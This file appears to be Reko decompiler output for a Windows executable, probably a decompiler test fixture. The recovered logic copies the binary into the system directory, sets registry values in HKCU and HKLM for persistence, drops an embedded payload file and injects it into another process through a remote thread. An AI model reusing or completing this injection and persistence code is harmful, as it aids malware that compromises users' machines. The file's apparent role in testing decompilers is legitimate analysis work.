// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: Register Eq_2 fn00401000(Register ui32 ecx, Stack Eq_4 dwArg04, Stack (ptr word32) dwArg08)
Eq_2 fn00401000(ui32 ecx, LPCSTR dwArg04, word32 * dwArg08)
{
}

// 00401041: Register Eq_69 fn00401041(Stack Eq_4 dwArg04, Stack Eq_71 dwArg08, Stack Eq_72 dwArg0C)
HANDLE fn00401041(LPCSTR dwArg04, LPCVOID dwArg08, Eq_72 dwArg0C)
{
	Eq_73 eax_24 = CreateFileA(dwArg04, 0x40000000, 0x03, null, 0x02, 0x00, null);
	if (eax_24 == (void *) 0x01)
		return eax_24 + 0x01;
	WriteFile(eax_24, dwArg08, dwArg0C, fp - 0x0C, null);
	CloseHandle(eax_24);
	return (void *) 0x01;
}

// 0040108D: void fn0040108D(Register ui32 ecx, Stack Eq_72 dwArg04, Stack Eq_4 dwArg08)
void fn0040108D(ui32 ecx, Eq_72 dwArg04, LPCSTR dwArg08)
{
	if (fn00401000(ecx, &globals->t405E74, &globals->ptr405EC8) == 0x00)
	{
		word32 * esp_248 = fp + ~0x23;
		if (LoadLibraryA(&globals->t405EDC) == 0x00)
			return;
		while (true)
		{
			esp_248 = esp_248 - 0x04;
			*esp_248 = 10000;
			Sleep(*esp_248);
		}
	}
	else
	{
		Eq_73 eax_56 = OpenProcess(0x043A, 0x00, dwArg04);
		if (eax_56 != null)
		{
			int32 eax_94 = lstrlenA(dwArg08);
			word32 ebp_109;
			byte SCZO_110;
			word32 ebx_111;
			word32 eax_112;
			byte SZO_113;
			byte C_114;
			byte Z_115;
			word32 edx_116;
			word32 ecx_117;
			ptr32 esp_108;
			globals->ptr405EC8();
			if (eax_112 != 0x00)
			{
				*(esp_108 - 0x04) = 0x00;
				*(esp_108 - 0x08) = eax_94;
				*(esp_108 - 0x0C) = (LPCSTR *) dwArg08;
				*(esp_108 - 0x10) = eax_112;
				*(esp_108 - 0x14) = (HANDLE *) eax_56;
				word32 ebp_154;
				byte SCZO_155;
				word32 ebx_156;
				word32 eax_157;
				byte SZO_158;
				byte C_159;
				byte Z_160;
				word32 edx_161;
				word32 ecx_162;
				ptr32 esp_153;
				globals->ptr405ED4();
				if (eax_157 != 0x00)
				{
					*(esp_153 - 0x04) = 4218484;
					Eq_2 eax_191 = GetModuleHandleA(*(esp_153 - 0x04));
					*(esp_153 - 0x08) = 4218471;
					*(esp_153 - 0x0C) = (union Eq_2 *) eax_191;
					Eq_2 eax_196 = GetProcAddress(*(esp_153 - 0x0C), *(esp_153 - 0x08));
					*(esp_153 - 0x10) = fp - 0x14;
					*(esp_153 - 0x14) = 0x00;
					*(esp_153 - 0x18) = eax_112;
					*(esp_153 - 0x1C) = (union Eq_2 *) eax_196;
					*(esp_153 - 0x20) = 0x00;
					*(esp_153 - 0x24) = 0x00;
					*(esp_153 - 0x28) = (HANDLE *) eax_56;
					word32 ebp_215;
					byte SCZO_216;
					word32 ebx_217;
					word32 eax_218;
					byte SZO_219;
					byte C_220;
					byte Z_221;
					word32 edx_222;
					word32 ecx_223;
					globals->ptr405ED0();
					if (eax_218 != 0x00)
					{
						*(esp_153 - 0x04) = ~0x00;
						*(esp_153 - 0x08) = eax_218;
						WaitForSingleObject(*(esp_153 - 0x08), *(esp_153 - 0x04));
						*(esp_153 - 0x0C) = fp - 0x1C;
						*(esp_153 - 0x10) = eax_218;
						GetExitCodeThread(*(esp_153 - 0x10), *(esp_153 - 0x0C));
						*(esp_153 - 0x14) = eax_218;
						CloseHandle(*(esp_153 - 0x14));
						esp_153 = esp_153 - 0x14;
					}
				}
				word32 * esp_169 = esp_153 - 0x04;
				*esp_169 = 0x8000;
				*(esp_169 - 0x04) = 0x00;
				*(esp_169 - 0x08) = eax_112;
				*(esp_169 - 0x0C) = (HANDLE *) eax_56;
				word32 ebp_180;
				byte SCZO_181;
				word32 ebx_182;
				word32 eax_183;
				byte SZO_184;
				byte C_185;
				byte Z_186;
				word32 edx_187;
				word32 ecx_188;
				globals->ptr405ECC();
			}
			HANDLE * esp_135 = esp_108 - 0x04;
			*esp_135 = (HANDLE *) eax_56;
			CloseHandle(*esp_135);
		}
	}
}

// 00401198: void fn00401198(Stack Eq_412 dwArg04)
void fn00401198(HKEY dwArg04)
{
	RegCreateKeyA(dwArg04, &globals->t405E2B, fp - 0x08);
	RegSetValueExA(dwLoc08, &globals->t403000, 0x00, 0x01, &globals->t405FE1, lstrlenA(&globals->t405FE1) + 0x01);
	RegCloseKey(dwLoc08);
}

// 004011DD: Register Eq_72 Win32CrtStartup()
Eq_72 Win32CrtStartup()
{
	GetSystemDirectoryA(&globals->t405FE1, 0x0104);
	lstrcatA(&globals->t405FE1, &globals->t40300D);
	GetModuleFileNameA(0x00, &globals->t4060E6, 0x0104);
	fn00401198((struct HKEY__ *) 0x80000001);
	fn00401198((struct HKEY__ *) 0x80000002);
	if (lstrcmpiA(&globals->t4060E6, &globals->t405FE1) == 0x00)
	{
		GetSystemDirectoryA(&globals->t405EDC, 0x0104);
		lstrcatA(&globals->t405EDC, &globals->t40301C);
		SetFileAttributesA(&globals->t405EDC, 0x80);
		ptr32 esp_110 = fp - 0x3C;
		if (fn00401041(&globals->t405EDC, &globals->v403026, 0x2E00) != 0x00)
		{
			GetWindowThreadProcessId(FindWindowA(&globals->t405E59, null), &globals->t405ED8);
			fn0040108D(ecx, globals->t405ED8, &globals->t405EDC);
			esp_110 = fp - 0x4C;
		}
		UINT * esp_123 = esp_110 - 0x04;
		*esp_123 = (uint32) 0x00;
		ExitProcess(*esp_123);
	}
	else
	{
		SetFileAttributesA(&globals->t405FE1, 0x80);
		ptr32 esp_43 = fp - 0x38;
		if (CopyFileA(&globals->t4060E6, &globals->t405FE1, 0x00) != 0x00)
		{
			SetFileAttributesA(&globals->t405FE1, 0x80);
			ShellExecuteA(null, &globals->t405E26, &globals->t405FE1, null, null, 0x00);
			esp_43 = fp - 88;
		}
		UINT * esp_68 = esp_43 - 0x04;
		*esp_68 = (uint32) 0x00;
		ExitProcess(*esp_68);
	}
}

